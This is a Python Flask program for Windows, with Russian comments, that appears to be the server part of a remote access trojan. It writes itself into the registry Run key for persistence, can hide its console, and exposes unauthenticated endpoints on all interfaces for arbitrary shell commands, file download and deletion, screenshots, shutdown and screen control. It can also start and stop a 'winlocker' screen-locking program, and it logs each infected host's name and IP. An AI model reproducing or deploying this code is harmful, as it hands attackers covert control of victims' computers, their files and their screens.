from flask import Flask, request, jsonify, send_file, Response
import os
import subprocess
import socket
from PIL import ImageGrab
import json
import ctypes
import winreg
import sys
import psutil
import time
import threading
import logging
from datetime import datetime
import traceback
import win32api

app = Flask(__name__)

# Глобальные переменные
WINLOCKER_PROCESS = None
SCREENSHOTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'screenshots')
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                           r"Software\Microsoft\Windows\CurrentVersion\Run", 
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RemoteControl", 0, winreg.REG_SZ, 
                         f'"{sys.executable}" "{os.path.abspath(__file__)}"')
        key.Close()
    except Exception as e:
        logger.error(f"Ошибка автозагрузки: {e}")

def normalize_path(path):
    """Нормализация пути для Windows"""
    if not path:
        return os.getcwd()
    path = path.replace('/', '\\')
    if not os.path.isabs(path):
        path = os.path.join(os.getcwd(), path)
    return os.path.normpath(path)

def get_drive_info(path):
    """Получение информации о диске"""
    if os.name == 'nt':
        drive = os.path.splitdrive(path)[0]
        try:
            volume_info = win32api.GetVolumeInformation(drive)
            return {
                "drive": drive,
                "label": volume_info[0],
                "serial": volume_info[1],
                "type": "Local Disk" if drive == "C:" else "Removable"
            }
        except Exception as e:
            logger.error(f"Ошибка получения информации о диске: {e}")
            return {"drive": drive, "error": str(e)}
    return {}

@app.route('/status', methods=['GET'])
def check_status():
    return jsonify({'status': 'online'}), 200

@app.route('/process', methods=['POST'])
def handle_process():
    try:
        data = request.json
        action = data.get('action')
        
        if action == 'list':
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_info']):
                try:
                    processes.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'user': proc.info['username'],
                        'cpu': round(proc.info['cpu_percent'], 1),
                        'memory': round(proc.info['memory_info'].rss / (1024 * 1024), 1)
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            processes.sort(key=lambda x: x['memory'], reverse=True)
            return jsonify({'status': 'success', 'processes': processes})
        
        elif action == 'manage':
            pid = data.get('pid')
            name = data.get('name')
            operation = data.get('operation')
            
            if not operation:
                return jsonify({'status': 'error', 'message': 'Не указана операция'}), 400
            
            try:
                if pid:
                    p = psutil.Process(int(pid))
                    processes = [p]
                elif name:
                    processes = []
                    for proc in psutil.process_iter(['name']):
                        if proc.info['name'].lower() == name.lower():
                            processes.append(proc)
                    if not processes:
                        return jsonify({'status': 'error', 'message': f'Процесс "{name}" не найден'}), 404
                else:
                    return jsonify({'status': 'error', 'message': 'Укажите PID или имя процесса'}), 400
                
                results = []
                for p in processes:
                    try:
                        if operation == 'kill':
                            p.terminate()
                            results.append(f'Процесс {p.pid} ({p.name()}) завершен')
                        elif operation == 'restart':
                            cmd = p.cmdline()
                            p.terminate()
                            time.sleep(1)
                            subprocess.Popen(cmd)
                            results.append(f'Процесс {p.pid} ({p.name()}) перезапущен')
                        else:
                            return jsonify({'status': 'error', 'message': 'Неизвестная операция'}), 400
                    except Exception as e:
                        results.append(f'Ошибка с процессом {p.pid}: {str(e)}')
                
                return jsonify({'status': 'success', 'message': '\n'.join(results)})
                
            except Exception as e:
                return jsonify({'status': 'error', 'message': str(e)}), 500
        
        return jsonify({'status': 'error', 'message': 'Неверное действие'}), 400
    
    except Exception as e:
        logger.error(f"Ошибка обработки процесса: {e}\n{traceback.format_exc()}")
        return jsonify({'status': 'error', 'message': f'Серверная ошибка: {str(e)}'}), 500

@app.route('/command', methods=['POST'])
def handle_command():
    global WINLOCKER_PROCESS
    
    data = request.json
    command = data.get("command")
    logger.info(f"Получена команда: {command}")
    
    try:
        if command == "start_winlocker":
            try:
                if WINLOCKER_PROCESS and WINLOCKER_PROCESS.poll() is None:
                    return jsonify({"status": "error", "message": "winlocker уже запущен"})
                
                possible_paths = [
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), "winlocker.py"),
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), "winlocker.exe"),
                    os.path.join("C:\\", "winlocker.py"),
                    os.path.join("C:\\", "winlocker.exe"),
                    os.path.join(os.environ["SystemRoot"], "winlocker.exe")
                ]
                
                winlocker_path = None
                for path in possible_paths:
                    if os.path.exists(path):
                        winlocker_path = path
                        break
                
                if not winlocker_path:
                    return jsonify({
                        "status": "error", 
                        "message": "Файл winlocker не найден. Проверьте следующие пути:\n" + 
                                 "\n".join(possible_paths)
                    }), 404
                
                if winlocker_path.endswith('.py'):
                    WINLOCKER_PROCESS = subprocess.Popen(
                        ["python", winlocker_path],
                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                    )
                else:
                    WINLOCKER_PROCESS = subprocess.Popen(
                        winlocker_path,
                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                    )
                    
                return jsonify({"status": "success", "message": f"winlocker запущен из {winlocker_path}"})
                
            except Exception as e:
                logger.error(f"Ошибка запуска winlocker: {e}\n{traceback.format_exc()}")
                return jsonify({"status": "error", "message": str(e)}), 500

        elif command == "stop_winlocker":
            try:
                if WINLOCKER_PROCESS:
                    parent = psutil.Process(WINLOCKER_PROCESS.pid)
                    children = parent.children(recursive=True)
                    
                    for child in children:
                        child.terminate()
                    
                    WINLOCKER_PROCESS.terminate()
                    WINLOCKER_PROCESS = None
                    
                    gone, alive = psutil.wait_procs(children, timeout=5)
                    for p in alive:
                        p.kill()
                    
                    return jsonify({"status": "success", "message": "winlocker остановлен"})
                else:
                    return jsonify({"status": "error", "message": "winlocker не запущен"})
            except Exception as e:
                logger.error(f"Ошибка остановки winlocker: {e}\n{traceback.format_exc()}")
                return jsonify({"status": "error", "message": str(e)}), 500

        elif command == "shutdown":
            os.system("shutdown /s /t 1")
            return jsonify({"status": "Компьютер выключается..."})
        
        elif command.startswith("explorer"):
            parts = command.split(" ", 2)
            action = parts[1] if len(parts) > 1 else "list"
            
            try:
                if action == "list":
                    path = parts[2] if len(parts) > 2 else os.getcwd()
                    path = normalize_path(path)
                    
                    if not os.path.exists(path):
                        return jsonify({
                            "status": "error", 
                            "message": f"Системе не удаётся найти указанный путь: {path}"
                        }), 404
                    
                    if not os.path.isdir(path):
                        return jsonify({"status": "error", "message": "Указанный путь не является папкой"}), 400
                    
                    print("Path: ", path)
                    items = os.listdir(path)
                    directories = []
                    files = []
                    
                    for item in items:
                        item_path = os.path.join(path, item)
                        if os.path.isdir(item_path):
                            directories.append(item)
                        else:
                            files.append(item)
                    
                    return jsonify({
                        "status": "success",
                        "current_path": path,
                        "directories": directories,
                        "files": files,
                        "drive_info": get_drive_info(path)
                    })
                
                elif action == "download":
                    filepath = parts[2] if len(parts) > 2 else ""
                    filepath = normalize_path(filepath)
                    
                    if not filepath or not os.path.exists(filepath):
                        return jsonify({"status": "error", "message": "Файл не существует"}), 404
                    
                    if os.path.isdir(filepath):
                        return jsonify({"status": "error", "message": "Нельзя скачать папку"}), 400
                    
                    try:
                        return send_file(
                            filepath,
                            as_attachment=True,
                            download_name=os.path.basename(filepath))
                    except Exception as e:
                        logger.error(f"Ошибка отправки файла: {e}\n{traceback.format_exc()}")
                        return jsonify({"status": "error", "message": str(e)}), 500
                
                elif action == "delete":
                    filepath = parts[2] if len(parts) > 2 else ""
                    filepath = normalize_path(filepath)
                    
                    if not filepath or not os.path.exists(filepath):
                        return jsonify({"status": "error", "message": "Файл не существует"}), 404
                    
                    try:
                        if os.path.isdir(filepath):
                            os.rmdir(filepath)
                        else:
                            os.remove(filepath)
                        return jsonify({"status": "success", "message": "Файл удален"})
                    except Exception as e:
                        logger.error(f"Ошибка удаления файла: {e}\n{traceback.format_exc()}")
                        return jsonify({"status": "error", "message": str(e)}), 500
                
                else:
                    return jsonify({"status": "error", "message": "Неизвестное действие проводника"}), 400
            
            except Exception as e:
                logger.error(f"Ошибка проводника: {e}\n{traceback.format_exc()}")
                return jsonify({"status": "error", "message": str(e)}), 500
        
        elif command == "screenshot":
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                screenshot_path = os.path.join(SCREENSHOTS_DIR, f"screenshot_{timestamp}.png")
                
                screenshot = ImageGrab.grab()
                screenshot.save(screenshot_path, "PNG")
                
                if not os.path.exists(screenshot_path):
                    logger.error("Файл скриншота не был создан")
                    return jsonify({"status": "Ошибка: файл скриншота не создан"}), 500
                    
                if os.path.getsize(screenshot_path) == 0:
                    logger.error("Получен пустой файл скриншота")
                    return jsonify({"status": "Ошибка: пустой файл скриншота"}), 500
                
                response = send_file(
                    screenshot_path,
                    mimetype='image/png',
                    as_attachment=True,
                    download_name=f"screenshot_{timestamp}.png"
                )
                
                @response.call_on_close
                def remove_file():
                    try:
                        if os.path.exists(screenshot_path):
                            os.remove(screenshot_path)
                            logger.info(f"Временный файл {screenshot_path} удален")
                    except Exception as e:
                        logger.error(f"Ошибка удаления файла: {e}")
                        
                return response
                
            except Exception as e:
                logger.error(f"Ошибка создания скриншота: {e}\n{traceback.format_exc()}")
                return jsonify({"status": f"Ошибка скриншота: {str(e)}"}), 500
        
        elif command == "restart":
            os.system("shutdown /r /t 1")
            return jsonify({"status": "Компьютер перезагружается..."})
        
        elif command == "lock":
            ctypes.windll.user32.LockWorkStation()
            return jsonify({"status": "Компьютер заблокирован"})
        
        elif command == "screen_off":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
            return jsonify({"status": "Экран выключен"})
        
        elif command == "screen_on":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
            ctypes.windll.user32.keybd_event(0x20, 0, 0, 0)
            ctypes.windll.user32.keybd_event(0x20, 0, 2, 0)
            return jsonify({"status": "Экран включен"})
        
        elif command.startswith("start "):
            cmd = command[6:]
            try:
                subprocess.Popen(cmd, shell=True)
                return jsonify({"status": f"Процесс запущен: {cmd}"})
            except Exception as e:
                logger.error(f"Ошибка запуска процесса: {e}\n{traceback.format_exc()}")
                return jsonify({"status": f"Ошибка: {str(e)}"})
        
        else:
            try:
                result = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True,
                    encoding='cp866'
                )
                return jsonify({"status": "success", "output": result})
            except subprocess.CalledProcessError as e:
                error_msg = e.output
                if "не является внутренней или внешней командой" in error_msg:
                    if os.path.exists(command.split()[0]):
                        error_msg = f"Файл '{command.split()[0]}' существует, но не является исполняемым"
                    else:
                        error_msg = f"Команда или файл '{command.split()[0]}' не найден"
                return jsonify({"status": "error", "output": error_msg})
            except Exception as e:
                logger.error(f"Ошибка выполнения команды: {e}\n{traceback.format_exc()}")
                return jsonify({"status": "error", "output": str(e)})
    
    except Exception as e:
        logger.error(f"Общая ошибка обработки команды: {e}\n{traceback.format_exc()}")
        return jsonify({"status": "error", "message": f"Серверная ошибка: {str(e)}"}), 500

@app.route('/command_stream', methods=['POST'])
def handle_command_stream():
    data = request.json
    command = data.get("command")
    logger.info(f"Получена потоковая команда: {command}")
    
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            encoding='cp866'
        )
        
        def generate():
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    yield f"data: {json.dumps({'output': output.strip()})}\n\n"
            
            stderr = process.stderr.read()
            if stderr:
                yield f"data: {json.dumps({'error': stderr.strip()})}\n\n"
            yield f"data: {json.dumps({'status': 'completed', 'exit_code': process.returncode})}\n\n"
        
        return Response(generate(), mimetype='text/event-stream')
    
    except Exception as e:
        logger.error(f"Ошибка потоковой команды: {e}\n{traceback.format_exc()}")
        return jsonify({"status": "error", "message": str(e)}), 500

try:
    if __name__ == '__main__':
        # Настройка кодировки для Windows
        if os.name == 'nt':
             import io
             import sys
             sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
             sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
        
        add_to_startup()
        
        ip = socket.gethostbyname(socket.gethostname())
        name = socket.gethostname()
        
        computers = {}
        if os.path.exists("computers.json"):
            with open("computers.json", "r", encoding='utf-8') as f:
                computers = json.load(f)
        computers[name] = ip
        with open("computers.json", "w", encoding='utf-8') as f:
            json.dump(computers, f, ensure_ascii=False, indent=2)
        
        logger.info(f"Сервер запущен на {ip}:5000")
        app.run(host='0.0.0.0', port=5000, threaded=True)
except Exception as e:
    print("Error", e)
input()